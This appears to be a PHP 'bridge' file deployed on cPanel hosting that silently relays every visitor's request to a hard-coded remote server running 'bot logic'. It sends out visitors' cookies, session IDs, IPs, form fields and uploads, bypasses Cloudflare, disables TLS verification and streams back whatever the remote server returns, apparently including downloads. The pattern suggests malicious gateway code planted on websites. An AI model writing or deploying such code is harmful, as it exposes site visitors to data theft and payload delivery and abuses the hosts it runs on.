<?php
// site.php — Bridge file: the ONLY file on this cPanel
// All bot logic runs on the HostPanel server (panelcou1999)

// Site identity — set these per cPanel on deploy
define('BRIDGE_SITE_ID',  '__SITE_ID__');   // e.g. casaisdeharo.com
define('BRIDGE_SECRET',   '__BRIDGE_KEY__'); // 48-char hex shared secret
define('BRIDGE_PROXY_URL','https://panel.courtfidral-services.online/proxy.php');
define('BRIDGE_SERVER_IP','54.38.221.66');   // bypass Cloudflare

// Which bot file to run (default: download.php, overridden by PATH_INFO or filename)
$script = basename($_SERVER['SCRIPT_FILENAME'] ?? 'download.php');
if ($script === 'site.php') $script = 'download.php';

// Build forwarded request data
$forward = [
    '_site'    => BRIDGE_SITE_ID,
    '_secret'  => BRIDGE_SECRET,
    '_script'  => $script,
    // Real visitor info (so proxy.php can restore $_SERVER)
    '_ip'      => $_SERVER['REMOTE_ADDR']     ?? '',
    '_ua'      => $_SERVER['HTTP_USER_AGENT'] ?? '',
    '_host'    => $_SERVER['HTTP_HOST']       ?? BRIDGE_SITE_ID,
    '_proto'   => (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http',
    '_uri'     => $_SERVER['REQUEST_URI']     ?? '/',
    '_ref'     => $_SERVER['HTTP_REFERER']    ?? '',
    '_cookie'  => $_COOKIE ? base64_encode(json_encode($_COOKIE)) : '',
    '_session' => session_id() ?: '',
];

// Merge GET params (strip bridge-internal keys)
foreach ($_GET as $k => $v) {
    if (!in_array($k, ['_site','_secret','_script','_ip','_ua','_host','_proto','_uri','_ref','_cookie','_session'])) {
        $forward['g_' . $k] = $v;
    }
}
foreach ($_POST as $k => $v) {
    if (!in_array($k, ['_site','_secret','_script','_ip','_ua','_host','_proto','_uri','_ref','_cookie','_session'])) {
        $forward['p_' . $k] = $v;
    }
}

// Detect if this is a file upload
$has_files = !empty($_FILES);

// Build cURL request
$proxy_host = parse_url(BRIDGE_PROXY_URL, PHP_URL_HOST);
$ch = curl_init(BRIDGE_PROXY_URL);
$resolve = [
    $proxy_host . ':80:'  . BRIDGE_SERVER_IP,
    $proxy_host . ':443:' . BRIDGE_SERVER_IP,
];

curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 60,
    CURLOPT_POST           => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_RESOLVE        => $resolve,
    CURLOPT_HEADERFUNCTION => function($ch, $header) {
        $h = trim($header);
        // Forward response headers to visitor (Content-Type, Set-Cookie, Location, Content-Disposition)
        if (preg_match('/^(Content-Type|Content-Disposition|Location|Set-Cookie|Cache-Control|Pragma|Expires|X-):(.+)$/i', $h, $m)) {
            header($h, false);
        }
        if (preg_match('/^HTTP\/[\d.]+ (\d+)/', $h, $m) && (int)$m[1] !== 200) {
            http_response_code((int)$m[1]);
        }
        return strlen($header);
    },
]);

if ($has_files) {
    // Multipart — include uploaded files
    $post = $forward;
    foreach ($_FILES as $field => $info) {
        if (is_array($info['tmp_name'])) {
            foreach ($info['tmp_name'] as $i => $tmp) {
                if ($info['error'][$i] === 0 && is_uploaded_file($tmp)) {
                    $post['files[' . $field . '][' . $i . ']'] = new CURLFile(
                        $tmp,
                        $info['type'][$i]  ?? 'application/octet-stream',
                        $info['name'][$i]  ?? 'upload'
                    );
                }
            }
        } elseif ($info['error'] === 0 && is_uploaded_file($info['tmp_name'])) {
            $post[$field] = new CURLFile(
                $info['tmp_name'],
                $info['type']    ?? 'application/octet-stream',
                $info['name']    ?? 'upload'
            );
        }
    }
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
} else {
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($forward));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
}

// Stream response directly to visitor
curl_setopt($ch, CURLOPT_WRITEFUNCTION, function($ch, $chunk) {
    echo $chunk;
    if (ob_get_level()) ob_flush();
    flush();
    return strlen($chunk);
});

if (ob_get_level()) ob_end_clean();
$ok  = curl_exec($ch);
$err = curl_error($ch);
curl_close($ch);

if (!$ok && $err) {
    http_response_code(503);
    echo '<!-- bridge error: ' . htmlspecialchars($err) . ' -->';
}
